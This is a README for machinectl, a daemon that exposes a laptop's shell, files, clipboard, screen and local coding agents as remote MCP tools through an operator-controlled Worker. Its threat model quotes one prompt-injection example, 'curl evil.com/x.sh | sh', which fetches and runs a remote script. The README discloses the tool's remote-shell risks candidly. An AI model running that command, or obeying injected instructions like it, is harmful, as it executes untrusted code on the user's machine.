# machinectl

Your laptop, as a remotely callable MCP tool runtime. The daemon opens an outbound WebSocket to a compatible operator-controlled Worker endpoint; that Worker is responsible for authentication, routing, and audit handling.

> **Deployment note:** this repository contains the laptop-side daemon only. You must provide a compatible Worker-side `MachineHost` endpoint protected by an authentication policy you control. Do not connect this daemon to an endpoint you do not trust.

## What changed from the prototype

The original machinectl bound a local port and pushed a Cloudflare quick tunnel up so an MCP client could reach in. That meant:

- The tunnel URL was the secret. Auth = "don't share the URL."
- The local daemon was the audit boundary. Lose the daemon, lose the trail.
- Anyone who learned the URL had a remote shell on your laptop.

**This version inverts that.** No inbound port, no quick tunnel. The laptop daemon opens an outbound WebSocket to an operator-controlled Worker. The Worker is the MCP endpoint and owns authentication, routing, and any audit policy. The laptop is only the execution runtime.

```
                       ┌──────────────────────────────┐
                       │ MCP client                   │
                       │ (MCP-capable client)         │
                       └──────────────┬───────────────┘
                                      │ POST /machinectl/mcp
                                      │ (operator-configured authentication)
                                      ▼
                       ┌──────────────────────────────┐
                       │ compatible Worker endpoint   │
                       │  • authentication gate       │
                       │  • per-user MachineHost DO   │
                       │  • audit policy/receipts     │
                       └──────────────┬───────────────┘
                                      │ WebSocket (outbound from laptop)
                                      │ keyed by Access email
                       ┌──────────────▼───────────────┐
                       │ machinectl daemon            │
                       │ (this repo, on your laptop)  │
                       │  • allow-listed tools        │
                       │  • path-restricted FS access │
                       └──────────────────────────────┘
```

Close your laptop → WS drops → tools auto-disappear from MCP `tools/list`. No "tunnel I forgot was open."

## Install

```bash
git clone https://github.com/acoyfellow/machinectl ~/cloudflare/machinectl
cd ~/cloudflare/machinectl
npm install
npm run build
```

You need `cloudflared` installed locally so the daemon can fetch your Access JWT. Install once:

```bash
brew install cloudflared
```

## Configure endpoint and authenticate

Set the trusted compatible Worker endpoint explicitly:

```bash
export MACHINECTL_URL=https://machinectl.example.com
```

If your endpoint is protected by Cloudflare Access, authenticate to that URL once:

```bash
cloudflared access login https://machinectl.example.com
```

The daemon obtains the cached Access JWT for the configured `MACHINECTL_URL` via `cloudflared access token`. Re-run login when your endpoint's Access session expires. For local testing or alternative launch environments, `MACHINECTL_ACCESS_TOKEN` may provide the token explicitly.

## Run

`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** used by `read_file`, `write_file`, `list_directory`, local-file targets passed to `open`, optional `cwd` checks for shell-capable tools, and local coding-agent sessions. It does **not** sandbox the contents of `exec_command` or the current shell-interpreted `git` tool. It has zero relationship to where the daemon binary itself lives.

```bash
# Allow filesystem tools to operate inside your project trees.
MACHINECTL_URL=https://machinectl.example.com \
MACHINECTL_ALLOWED_PATHS=/Users/you/projects,/Users/you/work \
  ~/cloudflare/machinectl/dist/index.js
```

Want to open it to your whole home dir? Sure — but think about what's in there (`.ssh/`, `.aws/`, browser sessions, etc.) before you do:

```bash
MACHINECTL_URL=https://machinectl.example.com MACHINECTL_ALLOWED_PATHS=$HOME \
  ~/cloudflare/machinectl/dist/index.js
```

Want the daemon to run, but catalogued filesystem and coding-agent tools to be unavailable? Just leave the var unset:

```bash
MACHINECTL_URL=https://machinectl.example.com ~/cloudflare/machinectl/dist/index.js
# → [!] filesystem and agent-session tools are DISABLED
# → [!] set MACHINECTL_ALLOWED_PATHS=/abs/path1,/abs/path2 and restart to enable
```

`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if supplied; without `cwd`, they run in the daemon's PWD. Their shell command content can still read or modify any resource available to the local user. Local-agent controls (`agent_*`) register only when allowed paths are configured because every new pi/OpenCode process must start in an explicitly scoped repository. `screenshot`, `processes`, `clipboard`, and `notify` are unaffected; `open` remains published for URLs but applies path checks to local-file targets.

Output on a successful connect:

```
[machinectl] machinectl daemon — machine: "your-macbook"
[machinectl] worker: https://machinectl.example.com
[machinectl] tools registered: exec_command, git, agent_start, agent_list, agent_status, agent_logs, agent_prompt, agent_steer, agent_follow_up, agent_pi_command, agent_abort, agent_stop, read_file, write_file, list_directory, screenshot, processes, clipboard, notify, open
[machinectl] connecting to wss://machinectl.example.com/machinectl/connect as "your-macbook"
[machinectl] connected; publishing tool catalog
```

An MCP client capable of authenticating through your endpoint's configured policy can call `https://machinectl.example.com/machinectl/mcp`. The call lands at the Worker, is handled according to its audit policy, is forwarded over your WebSocket, executes on your laptop, and returns along the same path. With allowed paths configured, the current daemon catalog contains 20 tools; without them, filesystem and `agent_*` tools are not published.

## Config

| Env var | Default | What it does |
|---|---|---|
| `MACHINECTL_URL` | (operator endpoint required) | Base URL of your trusted compatible Worker endpoint, e.g. `https://machinectl.example.com`. Set this explicitly before running the daemon. |
| `MACHINECTL_NAME` | `os.hostname()` | Human-readable machine name surfaced in the catalog + audit logs. |
| `MACHINECTL_ALLOWED_PATHS` | (empty) | Comma-separated absolute directory prefixes the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions may touch. **Filesystem and `agent_*` tools refuse to register if empty.** Multiple paths: `MACHINECTL_ALLOWED_PATHS=/Users/me/work,/Users/me/projects,/tmp/scratch`. Unrelated to where the daemon binary lives. |
| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`; minimum 1000 ms. No maximum is currently enforced. |
| `MACHINECTL_ACCESS_TOKEN` | (unset) | Override for the Access JWT instead of pulling from cloudflared. Useful in CI / containers. |
| `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active local pi/OpenCode sessions. Min 1, max 32. |
| `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Hard lifetime limit per local coding-agent session (default 2 hours; min 1 minute, max 24 hours). |
| `MACHINECTL_AGENT_STOP_GRACE_MS` | `5000` | Grace period after SIGTERM before the agent process group is SIGKILLed. |

## Tools

| Tool | Description | Path-gated |
|---|---|---|
| `exec_command` | Run a shell command. Captures stdout/stderr/exit. 256KB output cap. Timeout from `MACHINECTL_EXEC_TIMEOUT`. | Optional cwd is gated. |
| `git` | Run a shell command prefixed with `git` after checking that its first token is one of the listed git subcommands. **Because arguments are presently shell-interpreted, this tool is shell-equivalent and not a security boundary.** | Optional cwd is gated; command content is not confined. |
| `read_file` | Read a file (utf-8). Up to 256KB; larger files truncated with a notice. | Yes |
| `write_file` | Write content to a file. Creates parent dirs. Overwrites. | Yes |
| `list_directory` | List a directory. Set `recursive=true` and `maxDepth` (1–8, default 3) to walk children. | Yes |
| `screenshot` | Capture the screen, return base64 PNG. macOS: `screencapture`. Linux: `grim`/`scrot`. | No |
| `processes` | Top N processes by cpu or memory. | No |
| `clipboard` | Read/write the system clipboard. macOS: `pbpaste`/`pbcopy`. Linux: `wl-copy` / `xclip`. | No |
| `notify` | Send a system notification. macOS: `osascript`. Linux: `notify-send`. | No |
| `open` | Open a URL or file in the system default handler. URLs are unrestricted. This tool remains published without allowed paths; local-file targets are rejected at call time unless permitted. | File target gated at call time. |
| `agent_start` | Start a local `pi` session over RPC, or a captured bounded `opencode run` job. | Requires a `cwd` inside configured allowed paths. |
| `agent_list` / `agent_status` / `agent_logs` | Inspect active sessions, structured pi events, captured output, and optionally recent saved pi sessions for resume. | No additional path access. |
| `agent_prompt` / `agent_steer` / `agent_follow_up` | Prompt or steer a live pi RPC session. | Existing session only. |
| `agent_pi_command` | Run allow-listed pi controls: state/messages/stats, model/thinking changes, compact, switch/fork/clone/export. | Existing session only. |
| `agent_abort` / `agent_stop` | Interrupt active work or stop the local agent process. | Existing session only. |

## Local coding agents

`machinectl` can act as a remote control plane for coding agents already authenticated and configured on your laptop.

### pi: live, steerable sessions

`agent_start({ agent: "pi", cwd: "/absolute/repo", prompt: "..." })` starts `pi --mode rpc` locally and returns a machinectl session id. That session remains alive in the daemon so an MCP caller can subsequently:

- list recent persisted pi sessions with `agent_list({ includePersistedPi: true })` and reopen one via `agent_start({ agent: "pi", session: "<id-or-path>", ... })`
- send more work with `agent_prompt`
- steer in-flight work with `agent_steer`
- queue later work with `agent_follow_up`
- inspect events/transcript/state with `agent_status` and `agent_pi_command`
- change model or thinking level with `agent_pi_command`
- abort or stop it with `agent_abort` / `agent_stop`

Example sequence from an MCP caller:

```text
agent_start({agent:"pi", cwd:"/Users/me/projects/my-app", prompt:"inspect the failing tests and fix them"})
agent_status({id:"<returned id>"})
agent_steer({id:"<returned id>", message:"do not modify migrations; keep the fix in UI code"})
agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
```

### OpenCode: captured bounded jobs

`agent_start({ agent: "opencode", cwd: "/absolute/repo", prompt: "..." })` starts `opencode run --format json` and captures its output. Poll it with `agent_status` / `agent_logs` or stop it with `agent_stop`. Live prompt/steer controls are deliberately pi-only until OpenCode's programmatic session transport is integrated.

Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose recorded `cwd` remains inside those roots; explicit session paths, `switch_session`, and explicit `export_html` output paths are likewise gated. Running-session control state is held in daemon memory: if the daemon restarts, active session handles are lost, although pi-persisted session files may later be reopened. Agent processes are capped by count and runtime, are stopped as process groups on supported platforms, and tracked sessions are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.

## Audit

Audit behavior is implemented by the Worker endpoint, not by this daemon. In the compatible Worker implementation currently used by the author, a post-execution receipt is attempted in `AUDIT_KV`, keyed `machinectl:<email>:<ts>:<rand>` with a 90-day TTL. The current receipt shape includes timestamp, tool name, **raw arguments**, ok/error, and a result-content preview capped at 2 KB. This may retain sensitive material such as commands, prompt text, paths, clipboard input, or file/output excerpts. Do not use secret-bearing inputs or request sensitive output unless you trust and have reviewed your Worker's receipt policy.

Receipts are written after execution; a Worker-side receipt write failure can occur after a laptop action has already completed. Operators should implement the audit retention, redaction, alerting, and failure policy appropriate to their deployment.

## What's intentionally limited

- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** With a Cloudflare Access-protected endpoint, an Access JWT is the authentication mechanism used by this daemon. Operators using another compatible endpoint own its authentication design.
- **No quick tunnel.** No public URL to leak.
- **No local dashboard.** Any audit inspection or dashboard experience belongs to your Worker-side deployment, not this laptop daemon.
- **`exec_command` is full shell, by design.** The current `git` implementation is also shell-equivalent despite checking its first subcommand token; do not rely on it as a restricted execution boundary until it is changed to invoke Git without a shell.
- **Filesystem and `agent_*` tools refuse to register without `MACHINECTL_ALLOWED_PATHS`.** No `$HOME` default. Forces deliberate scoping.
- **One laptop per user at a time.** Latest WS connection wins; previous gets a clean close. If you connect from your work laptop while your home laptop is already up, the home laptop disconnects.

## Threat model (honest)

The blast radius of `exec_command` is the same as any LLM-driven terminal you already permit on this machine (Claude Code, OpenCode, Codex, etc.). Machinectl changes the transport and attribution model: the laptop makes an outbound connection to an authenticated Worker endpoint rather than exposing a local quick tunnel. That can improve access control and accountability, but it also introduces Worker-side routing and audit-retention risks that operators must evaluate.

- Caller attribution is determined by the configured Worker authentication policy.
- The reference Worker design can emit centralized audit receipts, whose redaction and failure semantics must be treated as part of the security boundary.
- Dedicated path tools (`read_file`, `write_file`, `list_directory`) and local-file `open` targets are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes; optional `cwd` checks do not sandbox shell command contents.
- No inbound laptop port or quick tunnel is required; only the configured Worker endpoint is remotely reachable.

What it does **not** defend against:
- A compromised laptop. For Cloudflare Access-based deployments, theft of locally cached Access credentials may allow impersonation until those credentials expire or are revoked.
- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. A Worker may attribute and receipt the action according to its policy; it does not prevent execution. This is the existing trust model of every LLM-with-shell tool.
- An LLM you don't trust. The threat model assumes the LLM-on-the-other-end is operating in your interest. If it isn't, no audit log saves you.

If you would not run a long-lived terminal session with an LLM that has shell access on this machine, do not run `machinectl`. If you would, evaluate the configured Worker's authentication, routing, and receipt-retention behavior as additional parts of that trust decision.

## Multi-machine

The current design is single-machine-per-user. The MCP catalog the Worker exposes is whatever that one connected laptop publishes. The wire format already includes a `machineName` in the `hello` frame, so multi-machine routing (for example a per-call `machine` argument) is a straightforward extension, but is not implemented yet.

## Development

```bash
npm install
npm run typecheck
npm test
npm run dev
```

The Worker-side relay is not bundled into this npm package. To run an endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, protect it with an authentication policy you control, and set `MACHINECTL_URL` to that deployment. Worker implementations may expose additional authenticated native invocation surfaces beyond the public daemon protocol; those surfaces are not provided by this repository.

## Security reporting

This project deliberately provides remote shell-equivalent capability through `exec_command` (enabled by default) and, in the current release, through the shell-interpreted `git` tool as well. Do not run it against an endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, execution lifecycle, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.

## License

MIT. See [LICENSE](./LICENSE).
